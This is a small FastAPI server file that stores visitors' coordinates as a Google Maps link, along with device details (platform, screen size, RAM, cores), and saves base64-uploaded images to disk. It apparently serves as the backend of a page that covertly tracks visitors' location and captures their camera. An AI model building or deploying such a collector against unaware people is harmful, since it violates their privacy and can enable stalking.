from fastapi import FastAPI, Request,UploadFile,HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import base64,uuid,json  # For generating unique file names
from fastapi.encoders import jsonable_encoder

app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

class ImageData(BaseModel):
    image: str

class Device(BaseModel):
    l1:str
    l2:str
    platform:str
    search_engin:str
    screenWidth:str
    screenHeight:str
    ram:str
    core:str
  

@app.get("/", response_class=HTMLResponse)
async def read_item(request: Request):
    return templates.TemplateResponse(
        request=request, name="index.html",)

@app.post("/send_info")
async def read_item(localtion:Device):
    json_compatible_item_data = jsonable_encoder(localtion)
    json_compatible_item_data["location"]=f'https://www.google.com/maps/search/?q={localtion.l1},{localtion.l2}'
    with open("data.json",'w') as file:
        file.write(json.dumps(json_compatible_item_data,indent=9))
    return {"success":"200"}


@app.post("/upload_images")
async def upload_images(image_data: ImageData):
    try:
        # Decode the image
        image_data_bytes = base64.b64decode(image_data.image.split(",")[1])
        filename = f"uploaded_image_{uuid.uuid4()}.png"

        # Save the image to a local file
        with open(filename, "wb") as file:
            file.write(image_data_bytes)

        return {"status": "success", "filename": filename}

    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Error processing image: {str(e)}")